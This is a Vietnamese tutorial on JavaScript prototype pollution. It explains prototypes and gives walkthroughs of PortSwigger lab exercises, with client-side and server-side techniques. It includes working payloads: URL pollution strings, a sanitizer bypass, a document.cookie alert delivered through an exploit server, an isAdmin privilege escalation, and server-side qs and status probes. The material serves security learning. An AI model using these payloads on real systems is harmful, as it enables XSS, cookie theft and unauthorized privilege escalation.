---
title: 'Web13: Prototype Pollution attack'
tags: [web13]

---

I. Kiến thức chuẩn bị
---------------------


### 1\. Object trong JavaScript

Trong JavaScript, đối tượng (object) là một thực thể bao gồm thuộc tính (properties) và phương thức (methods) liên quan đến nó, cấu tạo có dạng **`key:value`**.

```javascript!
var person = {
    name: "John",
    age: 25,
    introduce: function () {
        console.log("Xin chào, tôi là " + this.name + " và tôi " + this.age + " tuổi.");
    }
};

```

 

Trong ví dụ trên, đối tượng **`person`** có các thuộc tính **`name`** và **`age`**, phương thức **`introduce`**. Đối tượng này được khởi tạo theo cú pháp **object literal**. Ngoài ra có thể sử dụng **constructor function**:

```javascript!
function Person(name, age) {
    this.name = name;
    this.age = age;
    this.introduce = function () {
        console.log("Xin chào, tôi là " + this.name + " và tôi " + this.age + " tuổi.");
    };
}

var person = new Person("John", 25);

```

 

Để truy cập thuộc tính và phương thức của đối tượng, ta sử dụng cú pháp dấu chấm (dot notation) hoặc dấu ngoặc (bracket notation). Ví dụ:

```javascript!
console.log(person.name); // Kết quả: "John"
person.introduce(); // Kết quả: "Xin chào, tôi là John và tôi 25 tuổi."

```

 

### 2\. Prototype trong JavaScript

Trong cách khởi tạo **constructor function** phía trên, chú ý rằng mỗi class (lớp) trong JavaScript được thể hiện dưới dạng function (hàm):

```javascript!
function Foo() {
    this.bar = 1;
}

foo = new Foo();

```

 

Một object có thể được khởi tạo dựa trên class này thông qua từ khóa **new**. Bởi vậy có thể coi class là một dạng template (bản mẫu) của object. Tương tự, class cũng có template của nó, chính là prototype (nguyên mẫu). Có thể truy cập qua hai cách:

-   Gọi từ class: **`Foo.prototype`**

![image.png](https://images.viblo.asia/427b8f3d-5baf-40b0-b9d3-bd77505c9241.png)

-   Gọi từ object: **`foo.__proto__`**

![image.png](https://images.viblo.asia/8e8603af-d2d9-4907-92b5-f3bcfe017f11.png)

Một số ví dụ khác khi khởi tạo đối tượng thuộc các lớp đặc biệt **`Object`**, **`String`**, **`Array`**, **`Number`**:

```javascript!
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);     // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype

```

 

Đối tượng trong JavaScript cũng có thể kế thừa từ các prototype, cho phép tái sử dụng mã nguồn và chia sẻ các thuộc tính và phương thức giữa các đối tượng khác nhau.

```javascript!
function Person(name) {
  this.name = name;
}

Person.prototype.introduce = function() {
  console.log("Xin chào, tôi là " + this.name + ".");
};

var person1 = new Person("John");
person1.introduce(); // Kết quả: "Xin chào, tôi là John."

```

 

Trong ví dụ này định nghĩa một constructor function **`Person`** và thêm phương thức **`introduce`** vào prototype của nó. Đối tượng mới **`person1`** được tạo từ **`Person`** sẽ kế thừa từ prototype và có thể sử dụng phương thức **`introduce`**.

### 3\. Mô hình Prototypal inheritance (Kế thừa prototypal)

Mô hình **prototypal inheritance** trong JavaScript là một cách thức tạo ra sự kế thừa giữa các đối tượng thông qua prototype. Trong mô hình này, mỗi đối tượng có một prototype, và các đối tượng mới có thể kế thừa các thuộc tính và phương thức từ prototype của chúng. Cùng xem ví dụ sau:

```javascript!
// Định nghĩa một nguyên mẫu (prototype)
var personPrototype = {
    introduce: function() {
        console.log("Xin chào, tôi là " + this.name + " và tôi " + this.age + " tuổi.");
  }
};

// Tạo một đối tượng mới kế thừa từ prototype
var person1 = Object.create(personPrototype);
person1.name = "John";
person1.age = 25;

// Gọi phương thức introduce trên đối tượng
person1.introduce();

```

 

Chương trình tạo một prototype **`personPrototype`** bằng cách khai báo một đối tượng với phương thức **`introduce`**. Sau đó, đối tượng mới **`person1`** được tạo bằng phương thức **`Object.create()`** và truyền vào **`personPrototype`** làm prototype. Đối tượng mới này sẽ kế thừa tất cả các thuộc tính và phương thức từ **`personPrototype`**.

**Prototype-based inheritance** là một đặc điểm quan trọng của JavaScript, giúp tạo ra các mối quan hệ đối tượng linh hoạt và tiết kiệm bộ nhớ.

II. Lỗ hổng Prototype Pollution
-------------------------------

### 1\. Nguyên lý

Dựa theo cách hoạt động của mô hình **prototypal inheritance**, khi chúng ta gọi một thuộc tính từ đối tượng, JavaScript sẽ hiển thị giá trị bằng cách truy xuất thuộc tính đó "từ thấp lên cao". Chẳng hạn, khi được yêu cầu hiển thị **`foo.temp`**, nếu giá trị này không tồn tại sẽ tìm tới **`foo.__proto__.temp`**, không tồn tại sẽ tiếp tục tìm tới **`foo.__proto__.__proto__.temp`** ... cho tới khi gặp giá trị **`null`** mới dừng lại.

```javascript!
foo.temp; // undefined
foo.__proto__.temp; // undefined
foo.__proto__.__proto__.temp; // undefined
...
// null

```

 

Từ đây dễ dàng nhận thấy rằng nếu chúng ta có thể thay đổi giá trị các thuộc tính trong **`foo.__proto__`**, thì các thuộc tính của **`foo`** cũng sẽ thay đổi theo.

![image.png](https://images.viblo.asia/bc3964d1-14a7-478a-ba8a-07311d169d1a.png)

Đồng thời, việc thay đổi thuộc tính của class **`Foo()`** không ảnh hưởng đến thuộc tính trong đối tượng **`foo`** (Do cách hoạt động của prototypal inheritance).

![image.png](https://images.viblo.asia/d8fa900c-a5f6-4925-8fb9-9ba6cef2b50e.png)

Sự thay đổi như trên chỉ ảnh hưởng tới các đối tượng thuộc class **`Foo()`**. Xa hơn nữa, để gây ảnh hưởng tới thuộc tính của tất cả đối tượng nói chung, chúng ta sẽ cần "can thiệp" vào **prototype** của **`foo.__proto__`**, thật vậy:

![image.png](https://images.viblo.asia/b7676b7f-2f15-4ca8-8865-d124bd438387.png)

Đây cũng chính là nguyên lý hoạt động của lỗ hổng Prototype Pollution: Sự can thiệp vào các thuộc tính nằm trong prototype của class Object nói chung (**`foo.__proto__.__proto__`**) dẫn đến sự "pollution" tất cả thuộc tính của các đối tượng mới được tạo ra.

### 2\. Ví dụ

Để hiểu rõ hơn về dạng lỗ hổng này, chúng ta cùng xem xét ví dụ sau

```javascript!
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

```

 

Hàm **`merge()`** cho phép hợp nhất các phần tử từ **`source`** vào **`target`**, cụ thể: nếu **`source`** chứa phần tử **`x`** trong khi **`target`** chưa có **`x`**, hàm sẽ sao chép phần tử **`x`** từ **`source`** vào **`target`**.

![image.png](https://images.viblo.asia/1271c6f9-8e50-4fa3-89b0-89bbea6d8f03.png)

Một câu hỏi đặt ra tại dòng code **`target[key] = source[key]`**: Nếu **`key`** nhận giá trị là **`__proto__`**, ví dụ với **`object2 = {a: 1, "__proto__": {b: 2}};`**, thì chúng ta có thể thực hiện prototype pollution hay không? Rất tiếc rằng câu trả lời là chưa thể thực hiện được:

![image.png](https://images.viblo.asia/ddee7391-b7cc-4884-a845-5787d41bc302.png)

Khá bất ngờ phải không nhỉ! Thực ra ngay sau khi đối tượng **`object2`** được tạo ra, thì **`__proto__`** lúc này đã đóng vai trò là **`prototype`** của **`object2`** rồi, không còn đóng vai trò là **key** nữa. Dễ ràng kiểm chứng bằng cách liệt kê các **key** của **`object2`**:

![image.png](https://images.viblo.asia/fa0692c7-70af-4851-a671-ef2d45d117cd.png)

Tức là, đối với các trường hợp **`__proto__`** đóng vai trò là một **key** thì lỗ hổng tồn tại. Chẳng hạn với hàm **`JSON.parse()`**:

```json
JSON.parse('{"a": "1", "__proto__": {"b": "2"}}')

```

 

![image.png](https://images.viblo.asia/eb37044d-3b19-4838-adca-4c0cd9eb3ad3.png)

Lúc này, tất cả đối tượng mới được tạo ra đều bị ảnh hưởng:

![image.png](https://images.viblo.asia/7bf05f5e-56cc-4c51-b30b-e1cfad57f6fb.png)

Một đoạn code khác chứa lỗ hổng:

```javascript!
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
let o1 = JSON.parse('{"constructor": {"prototype": {"hello": 1}}}')
merge({},o1)

let o2 = {}
console.log(o2.hello)

```

 

Từ các phân tích phía trên, chúng ta có thể tổng hợp lại các điều kiện cần đồng thời thỏa mãn trong một cuộc tấn công **Prototype Pollution**:

-   Đối tượng được thực hiện hợp nhất đệ quy hoặc các hành vi tương tự.
-   Thuộc tính đối tượng được xác thực theo phương thức kế thừa prototypal.

III. Phân tích và khai thác các kỹ thuật phát hiện, tấn công Client-side - Prototype Pollution
----------------------------------------------------------------------------------------------

**Client-side prototype pollution** xảy ra khi ứng dụng web cho phép người dùng kiểm soát các thuộc tính hoặc giá trị của prototype phía client. Kẻ tấn công có thể lợi dụng lỗ hổng này nhằm thay đổi các thuộc tính quan trọng trong prototype, gây ảnh hưởng đến hành vi của ứng dụng và có thể dẫn đến các cuộc tấn công khác như XSS (Cross-Site Scripting) hoặc CSRF (Cross-Site Request Forgery).

## 1\. Sử dụng Console tool

Thông thường, các điểm đầu vào (input) trong một ứng dụng web sẽ là điểm bắt đầu tấn công của các hacker. Nếu kiểm tra bằng cách thử tại tất cả điểm input của ứng dụng sẽ cần rất nhiều trường hợp và tốn lượng thời gian lớn. Có thể sử dụng một phương pháp kiểm tra đơn giản hơn như sau:

Bước 1 1: Thêm các phần tử prototype dưới dạng tham số trong URL. Ví dụ:

```none
vulnerable-website.com/?__proto__[foo]=bar
vulnerable-website.com/?__proto__.foo=bar
vulnerable-website.com/?constructor[prototype][foo]=bar
vulnerable-website.com/?constructor.prototype.foo=bar

```

 

Bước 2 2: Sử dụng **Console Tool** trong bộ công cụ Dev Tools, kiểm tra giá trị **`Object.prototype.foo`**. Nếu giá trị trả về là **`bar`** cũng đồng nghĩa với việc trang web chứa lỗ hổng, nếu trả về **`undefined`** tức tấn công chưa thành công.

![image.png](https://images.viblo.asia/db958b0d-2c0d-432f-92eb-65b4a16a459d.png)

Lặp lại 2 2 bước trên tại các đường dẫn khác nhau của trang web.

Khi phát hiện ứng dụng chứa lỗ hổng, một trong những hướng tấn công phổ biến là thực hiện chèn payload để khai thác lỗ hổng **XSS**, thông thường bằng cách phân tích và tìm kiếm các tham số thuộc tính có thể được tận dụng trong các tệp **`.js`** của ứng dụng. Trong đó, chú ý các đoạn chương trình sử dụng các hàm, chức năng tiềm ẩn nguy cơ bị tấn công XSS như **`innerHTML`** hoặc **`eval()`**.

### **1. Lab: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) via client-side prototype pollution**
>This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:
>1.  Find a source that you can use to add arbitrary properties to the global `Object.prototype`.  
>2.  Identify a gadget property that allows you to execute arbitrary JavaScript.   
>3.  Combine these to call `alert()`.
>You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.
![image](https://hackmd.io/_uploads/rkS7CuqPA.png)

>Thêm payload vào URL web để thực hiện poison protype `/?__proto__[foo]=bar`:
>![image](https://hackmd.io/_uploads/Hk9d1FqP0.png)

>Sau đó, ở Console, ta nhập giá trị **`Object.prototype.foo`**. Nếu giá trị trả về là **`bar`** cũng đồng nghĩa với việc trang web chứa lỗ hổng, nếu trả về **`undefined`** tức tấn công chưa thành công. Ở đây kết quả trả về `bar` chứng tỏ ta có thể thực hiện poison thành công:
>![image](https://hackmd.io/_uploads/rJLn1tqDA.png)

>Hiện tại chúng ta có thể thay đổi giá trị thuộc tính bất kỳ của tất cả đối tượng trang web sử dụng. Điều cần quan tâm lúc nào là đối tượng nào chứa thuộc tính có thể bị lợi dụng.

>Ta có thể sử dụng tool DOM Invader của BurpSuite để scan giúp làm việc nhanh hơn! Quan sát rằng DOM Invader đã xác định được hai vectơ prototype pollution trong thuộc tính `search`, tức là chuỗi truy vấn:
>![image](https://hackmd.io/_uploads/rydx7tcv0.png)

>Click chọn **Scan for gadgets**, tool sẽ chuyển ta sang tab mới và thực hiện việc scan source ta chọn. Sau khi scan kết thúc, mở lại DevTool và thấy DOM Invader đã truy cập thành công vào sink `script.src` thông qua tiện ích `transport_url`:
>![image](https://hackmd.io/_uploads/BkKwXtqw0.png)

>Click chọn **Exploit**, thành công trigger hàm alert():
>![image](https://hackmd.io/_uploads/SkXoQt9PA.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/S1bhXYcvC.png)

### **2. Lab: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) via an alternative prototype pollution vector**
>This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:
>1.  Find a source that you can use to add arbitrary properties to the global `Object.prototype`.  
>2.  Identify a gadget property that allows you to execute arbitrary JavaScript.    
>3.  Combine these to call `alert()`.    
>You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.
![image](https://hackmd.io/_uploads/B12QNK9vC.png)

>Tiếp tục sử dụng DOM Invader:
>![image](https://hackmd.io/_uploads/ByUkBY5PC.png)

>Tool phát hiện ra được 1 sink có thể khai thác `eval()`:
>![image](https://hackmd.io/_uploads/HyUXSY9PA.png)

>Click Exploit và tool sinh ra payload cho việc khai thác:
>![image](https://hackmd.io/_uploads/ByJm8YcDR.png)

>Để ý rằng khi phát hiện ra `sink`, kí tự `1` được thêm vào payload:
>![image](https://hackmd.io/_uploads/S1BEIY9PA.png)

>Do đó, thực hiện Exploit thêm 1 lần nữa, và thêm kí tự `-` vào cuối URL và tải lại trang, ta đã trigger thành công hàm `alert()`:
>![image](https://hackmd.io/_uploads/H1Pevtqw0.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/rJmZvKcDR.png)

## 2\. Bypass filter

Đôi khi, chúng ta gặp phải một số cơ chế phòng ngừa tấn công **prototype pollution**. Kiểm tra và phân tích các file **`.js`** có thể giúp chúng ta tìm ra cách thức vượt qua lớp cơ chế bảo vệ này. Ví dụ:

```javascript=
function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}

```

 

Chương trình trên kiểm tra các từ khóa **`constructor`**, **`__proto__`**, **`prototype`** trong URL, nếu tồn tại sẽ thực hiện loại bỏ các từ khóa này bằng hàm **`replaceAll()`**. Tuy nhiên, do hàm **`replaceAll()`** chỉ loại bỏ duy nhất 1 1 lần từ khóa được yêu cầu. Nên có thể dễ dàng bypass bằng cách "double" từ khóa, ví dụ:

**`__pro__proto__to__[foo]=bar`**

### **3. Lab: Client-side [prototype pollution](https://portswigger.net/web-security/prototype-pollution) via flawed sanitization**
![image](https://hackmd.io/_uploads/Sy04ttcvA.png)

>Truy cập bài lab, đọc source code js, ta phát hiện thấy 1 request `GET /resources/js/searchLoggerFiltered.js` thực hiện việc filter URL:
>![image](https://hackmd.io/_uploads/HkfkcY5PR.png)

>Chương trình trên kiểm tra các từ khóa **`constructor`**, **`__proto__`**, **`prototype`** trong URL, nếu tồn tại sẽ thực hiện loại bỏ các từ khóa này bằng hàm **`replaceAll()`**. Tuy nhiên, hàm này không thực hiện việc filter đệ quy, nên ta có thể viết lại payload như sau để bypass: `/?__pro__proto__to__[foo]=bar`

>Kiếm tra bằng cách thủ công, ta thấy hướng đi khả thi:
>![image](https://hackmd.io/_uploads/SJKa9K5DC.png)

>Xem lại source code ta nhận thấy rằng `searchLogger.js` tự động thêm tập lệnh vào DOM bằng cách sử dụng thuộc tính `transport_url` của đối tượng `config` (nếu có):
>![image](https://hackmd.io/_uploads/SJdMpt5PR.png)

>Do đó, ta có thể sử dụng payload sau để trigger `alert()`: 
>`/?__pro__proto__to__[transport_url]=data:,alert(1);`

>Alert thành công:
>![image](https://hackmd.io/_uploads/SJ7y0FqPR.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/r1yxCt9vC.png)

## 3\. Khai thác lỗ hổng với DOM Invader

Đôi khi, một số trang web chứa số lượng tệp **`.js`** lớn và mỗi tệp có thể lên đến hàng nghìn, thậm chí chục nghìn dòng code khiến cho việc tìm kiếm các thuộc tính đối tượng gặp nhiều khó khăn, đôi khi tiêu tốn lượng thời gian lớn nhưng không thu lại được kết quả mong đợi. Và đây là lúc chúng ta cần tìm kiếm đến các công cụ giúp tự động hóa việc tìm kiếm / khai thác lỗ hổng. Phần mềm Burp Suite cung cấp một công cụ hữu ích là **DOM Invader**. Công cụ cho phép tự động tìm kiếm, rà soát các file **`.js`**

### **3. Lab: Client-side [prototype pollution](https://portswigger.net/web-security/prototype-pollution) via flawed sanitization**
![image](https://hackmd.io/_uploads/B1u8y95P0.png)

>Tiếp tục sử dụng DOM Invader, phát hiện 1 source khả nghi `hash`:
>![image](https://hackmd.io/_uploads/SJ-Ae5cDA.png)

>Chọn **Scan for gadgets**:
>![image](https://hackmd.io/_uploads/SksOWccwA.png)

>Click **Exploit**, tool sẽ tự động sinh ra payload:
>![image](https://hackmd.io/_uploads/HJJsZc5vA.png)
![image](https://hackmd.io/_uploads/r1UlM59wA.png)

>Có được payload, ta sẽ gửi cho victim qua exploit server;
```javascript
<script>
    location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
```
![image](https://hackmd.io/_uploads/S1bYM5cDA.png)

>**"Deliver exploit to victim"** và hoàn thành bài lab: 
>![image](https://hackmd.io/_uploads/HkWhfq5PR.png)

IV. Phân tích và khai thác các kỹ thuật phát hiện, tấn công Server-side - Prototype Pollution
---------------------------------------------------------------------------------------------

## 1\. Điểm khác biệt với lỗ hổng phía client

Khác với lỗ hổng xảy ra ở phía client, Server-side - Prototype Pollution chỉ các lỗ hổng xuất hiện với các dữ liệu hoạt động tại máy chủ. Mặc dù JavaScript ban đầu là một ngôn ngữ chuyên sinh ra với mục đích lập trình cho hệ thống front end, nhưng theo sự thay đổi của thời gian, ngôn ngữ JavaScript nói chung được các nhà phát triển ứng dụng sử dụng rộng rãi để xây dựng máy chủ, API cũng như các hệ thống back end khác. Bạn đọc có thể đọc thêm cuốn sách **[JavaScript from Frontend to Backend](https://www.amazon.com/JavaScript-Frontend-Backend-Learn-development/dp/1801070318)**.

## 2\. Khó khăn

Khi kiểm tra và khai thác lỗ hổng Prototype Pollution xảy ra ở phía server, chúng ta sẽ phải đối đầu với một số khó khăn, vấn đề phát sinh cần giải quyết.

-   **Không có mã nguồn**: Tất nhiên, ở phía server thì các lỗ hổng sẽ không hề liên quan tới các tệp **`.js`** mà chúng ta có thể đọc tùy ý ở trang web. Có thể coi việc kiểm tra dạng lỗ hổng Prototype Pollution dạng server-side giống như một công cuộc kiểm thử "blackbox".
-   **Không có dấu hiệu rõ ràng**: Với client-side pollution, chúng ta có thể dễ dàng kiểm tra các thuộc tính đã bị lây nhiễm chưa thông qua **`Object.prototype`** trong **console tool**. Với server-side, các giá trị thuộc tính thường không hiển thị trong giao diện (một số trường hợp reflect trong response có thể dễ dàng kiểm tra), chúng ta chỉ có thể cố gắng tìm kiếm các dấu hiệu để thực hiện nhận biết.
-   **Ảnh hưởng tới hệ thống**: Một số thuộc tính bị thay đổi trong môi trường server-side có thể ảnh hưởng tới luồng hoạt động của chương trình, dẫn đến hệ thống gặp lỗi không mong muốn.
-   **Khó khôi phục dữ liệu**: Việc không thể biết giá trị ban đầu của thuộc tính sau khi thực hiện lây nhiễm thành công dẫn đến khó khôi phục lại thuộc tính đó trở về giá trị lúc trước, gây ảnh hưởng tới toàn bộ hệ thống.

Bên cạnh việc tìm kiếm và xác nhận lỗ hổng, chúng ta còn phải chú ý tránh các tác động xấu tới server. Hãy cùng xem xét một số phương pháp độc đáo giúp chúng ta phát hiện dạng lỗ hổng này mà vẫn đảm bảo hoạt động bình thường của hệ thống trong các phần tiếp theo.

## 3\. Phát hiện lỗ hổng trong trường hợp dữ liệu được hiển thị trong response

Chắc hẳn với các bạn trong ngành Công nghệ thông tin nói chung đều đã rất quen thuộc với vòng lặp **`for`**. Xem xét cấu trúc **`for...in`** trong ngôn ngữ JavaScript để liệt kê tất cả thuộc tính trong một đối tượng.

```javascript!
const testObject = {'a': 1, 'b': 2};
for (propertyKey in testObject) {
    console.log(propertyKey);
}
// Output: a b

```

 

Điều đặc biệt là vòng lặp này sẽ liệt kê cả các thuộc tính mà đối tượng kế thừa từ nguyên mẫu (đối tượng không chứa thuộc tính đó). Thật vậy, bổ xung thuộc tính **`test`** vào **`Object.prototype`**:

```javascript!
const testObject = {'a': 1, 'b': 2};
Object.prototype.test = '3';
for (propertyKey in testObject) {
    console.log(propertyKey);
}

```

 

Kết quả:

![image.png](https://images.viblo.asia/de57e4b5-3e41-4efc-8b49-b11dadfb520f.png)

Như vậy, khi các lập trình viên sử dụng vòng lặp **`for...in`** trong quá trình xây dựng chức năng hiển thị các thuộc tính của đối tượng, sẽ "vô tình" giúp kẻ tấn công có thể kiểm tra lỗ hổng một cách dễ dàng hơn. Ví dụ một chương trình như sau:

```javascript!

function getUserData(data) {
    const userData = {};
    for (const key in data) {
        console.log(key)
        userData[key] = data[key];
    }
    return userData;
}

// ...

// Reflect the data in the response
res.json({
    Message: "Profile updated successfully",
    UserData: getUserData(dataProfile),
});
```
### **5. Lab: Privilege escalation via server-side prototype pollution**
![image](https://hackmd.io/_uploads/r1KaOOsDA.png)

>Theo mô tả thì lab này chứa lỗ hổng prototype pollution phía server-side, và ta có nhận detect thông qua HTTP respone.

>Đăng nhập vào `wiener:peter`, ta thấy có chức năng Update thông tin mua hàng:
>![image](https://hackmd.io/_uploads/rkbOFOoPR.png)

>Bắt request change thông tin:
>![image](https://hackmd.io/_uploads/r1qsYOsDC.png)

>Ứng dụng gửi dữ liệu tới server bằng JSON và response hiển thị các thông tin của người dùng **wiener**. Chúng ta có thể thêm tùy ý cặp **`key:value`**
![image](https://hackmd.io/_uploads/H1DycusPA.png)

>Tải lại trang và submit các lần sau nhận thấy cặp **`test:ducanh`** vẫn tồn tại, thuộc tính mới dường như được thêm và lưu trữ cố định vào object trong server:
>![image](https://hackmd.io/_uploads/B1875OswR.png)

>Để ý trong respone có 1 thuộc tính ẩn `isAdmin: false`:
>![image](https://hackmd.io/_uploads/H1w_5uiD0.png)

>Đến đây thì chắc hẳn ý đồ của lab muốn ta attack prototype để change `isAdmin:true`:
>![image](https://hackmd.io/_uploads/B1oxi_sw0.png)

>Tải lại trang và thấy rằng thuộc tính của `wiener` đã được thay đổi lên admin và có giao diện Admin Panel:
>![image](https://hackmd.io/_uploads/BJwNoOswR.png)

>Xóa `carlos` và hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/H1J8o_jvA.png)

Như vậy, khi sử dụng cấu trúc **`for...in`** trong các chức năng hiển thị thuộc tính đối tượng, chúng ta nên thêm một bước kiểm tra đối tượng có thuộc tính đang xét không **`data.hasOwnProperty(key)`** nhằm tránh việc ứng dụng hiển thị các thuộc tính kế thừa từ prototype. Ví dụ:

```javascript!
function getUserData(data) {
    const userData = {};
    for (const key in data) {
        if (data.hasOwnProperty(key)) {
            userData[key] = data[key];
        }
    }
    return userData;
}

```

 

Các phần tiếp theo chúng ta sẽ cùng tìm hiểu về một số phương pháp phát hiện lỗ hổng trong trường hợp trang web không trả về các dữ liệu input từ người dùng.

## 4\. Sử dụng một số thuộc tính trong thư viện **`qs`** thực hiện kiểm tra

### 4.1. Thuộc tính **`parameterLimit`**

Trong **Express**, **`body-parser`** là một middleware được sử dụng để phân tích (parse) dữ liệu trong request được gửi từ client và đưa vào thuộc tính req.body để sử dụng trong quá trình xử lý. Chú ý tùy chọn **`parameterLimit`**, theo [https://github.com/expressjs/body-parser#parameterLimit:](https://github.com/expressjs/body-parser#parameterLimit:)

> The parameterLimit option controls the maximum number of parameters that are allowed in the URL-encoded data. If a request contains more parameters than this value, a 413 will be returned to the client. Defaults to 1000.

Có thể hiểu thuộc tính **`parameterLimit`** được sử dụng để giới hạn số lượng tham số (parameters) mà Express sẽ phân tích trong request. Đặc biệt, khi ứng dụng sử dụng thư viện **qs**, ví dụ trong phiên bản **[v6.4.0](https://npmdoc.github.io/node-npmdoc-qs/build/apidoc.html)**:

```javascript!
options.parameterLimit = typeof options.parameterLimit === 'number' ? options.parameterLimit : defaults.parameterLimit;

```

 

Chương trình kiểm tra thuộc tính **`parameterLimit`** nếu có kiểu **`number`** sẽ sử dụng luôn giá trị đó làm số lượng tham số giới hạn, ngược lại để giá trị mặc định 1000 1000. Bởi vậy, nếu ứng dụng tồn tại lỗ hổng Prototype pollution phía server, chúng ta có thể kiểm tra bằng cách thay đổi thuộc tính **`parameterLimit`**, và quan sát response với số lượng tham số trong request vượt giới hạn đó.

Ví dụ một chương trình luôn trả về giá trị tham số **`test`** do người dùng nhập từ URL, nếu không tìm thấy sẽ trả về **`undefined`**:

![image.png](https://images.viblo.asia/ffec59bf-49bc-4a53-9098-871027249db3.png)

Cố gắng thay đổi giá trị thuộc tính **`parameterLimit`** với payload:

```json!
"__proto__": {
    "parameterLimit": 1
}

```

 

Nếu lỗ hổng tồn tại, chúng ta chỉ có thể sử dụng một tham số duy nhất:

![image.png](https://images.viblo.asia/42a90663-cb09-4e13-8b8a-864ca772e680.png)

### 4.2. Thuộc tính **`ignoreQueryPrefix`**

Thông thường, khi chúng ta truyền tham số dạng **`??test=`** hệ thống sẽ không thể phân tích cú pháp hợp lệ, dẫn đến giá trị **`test`** không được tiếp nhận.

![image.png](https://images.viblo.asia/33cff210-8683-4194-b8b7-09c09f0b9653.png)

Tuy nhiên, trong thư viện **qs** chứa tùy chọn **`ignoreQueryPrefix`** nếu có giá trị **true** sẽ cho phép ứng dụng chấp nhận kiểu truy vấn như trên. Tham khảo thêm tại [https://github.com/ljharb/qs/blob/main/dist/qs.js#L270](https://github.com/ljharb/qs/blob/main/dist/qs.js#L270)

![image.png](https://images.viblo.asia/fc74e3f3-e5b5-4d08-8ec7-ae47776926d3.png)

Nếu thay đổi được giá trị thuộc tính **`ignoreQueryPrefix`**:

```json!
"__proto__": {
    "ignoreQueryPrefix": true
}

```

 

Kiểm tra lại trang web, kết quả cho thấy tham số đã được chấp nhận:

![image.png](https://images.viblo.asia/a140f4df-80a2-4e68-8ab4-ffccca860508.png)

### 4.3. Thuộc tính **`allowDots`**

Tương tự với **`ignoreQueryPrefix`**, tùy chọn **`allowDots`** cho phép tham số sử dụng dấu chấm **`.`** trở thành vai trò như một object:

![image.png](https://images.viblo.asia/f66a5e15-2197-4d22-b189-e90ab2e71fb1.png)

## 5\. Sử dụng các phương thức ghi đè kiểm tra lỗ hổng

### 5.1. Ghi đè Status code

Trong quá trình sử dụng trang web, đôi khi chúng ta gặp các tình trạng không thể truy cập một endpoint nào đó, điều này xảy ra có thể do nhiều nguyên nhân. Thường thấy nhất là do chúng ta không đủ quyền hạn để truy cập. Trong BurpSuite, response khi truy cập endpoint đó có thể trả về trạng thái lỗi trong kiểu JSON như sau:

```json!
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}

```

 

Chương trình tạo ra response như trên có thể bị khai thác bởi lỗ hổng Prototype Pollution, chẳng hạn hàm **`createError()`** trong module **http-errors** của **Nodejs**, tham khảo tại **`index.js`** trong [https://www.npmjs.com/package/http-errors?activeTab=code:](https://www.npmjs.com/package/http-errors?activeTab=code:)

```javascript!
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...

```

 

Đoạn code **`status = err.status || err.statusCode || status`** kiểm tra giá trị **`err.status`** hoặc **`err.statusCode`** nếu tồn tại sẽ gán giá trị cho **`status`**, ngược lại **`status`** sẽ giữ nguyên giá trị của nó. Ý tưởng tự nhiên là có thể thay đổi thuộc tính **`status`** trong **`Object.prototype`**, từ đó thay đổi được giá trị **`status`** theo ý muốn. Tuy nhiên, cần lựa chọn giá trị phù hợp cho **`Object.prototype.status`** vì:

```javascript!
if (typeof status !== 'number' || (!statuses.message[status] && (status > 400 || status >= 600))) {
    status = 500
}
//...

```

 

Đoạn code kiểm tra nếu **`status`** mang giá trị nằm ngoài đoạn \[400;599\] \[400; 599\] sẽ thay đổi về giá trị mặc định là 500 500, bởi vậy nên lựa chọn giá trị ghi đè trong khoảng này.

### 5.2. Ghi đè Charset

Charset (Bảng mã) được sử dụng để xác định cách mã hóa các ký tự. Khi một trang web được tải, thông tin charset thường được xác định trong thẻ meta để trình duyệt biết cách hiển thị các ký tự đúng định dạng:

```htmlmixed!
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Trang web ví dụ</title>
</head>
<body>
  <!-- Nội dung trang web -->
</body>
</html>

```

 

Đối với **Express**, middleware module **body-parser** cũng cung cấp một tùy chọn cho phép cài đặt định dạng ký tự hiển thị là **`defaultCharset`**, theo [https://expressjs.com/en/resources/middleware/body-parser.html:](https://expressjs.com/en/resources/middleware/body-parser.html:)

> Specify the default character set for the text content if the charset is not specified in the Content-Type header of the request. Defaults to utf-8.

Điều đó được thể hiện rõ hơn trong đoạn code sau (đoạn code có thể tìm thấy tại [https://github.com/expressjs/body-parser/blob/ee91374eae1555af679550b1d2fb5697d9924109/lib/types/json.js](https://github.com/expressjs/body-parser/blob/ee91374eae1555af679550b1d2fb5697d9924109/lib/types/json.js)):

```javascript!
function getCharset (req) {
  try {
    return (contentType.parse(req).parameters.charset || '').toLowerCase()
  } catch (e) {
    return undefined
  }
}

// ...

read(req, res, next, parse, debug, {
      encoding: charset,
      inflate: inflate,
      limit: limit,
      verify: verify
})

```

 

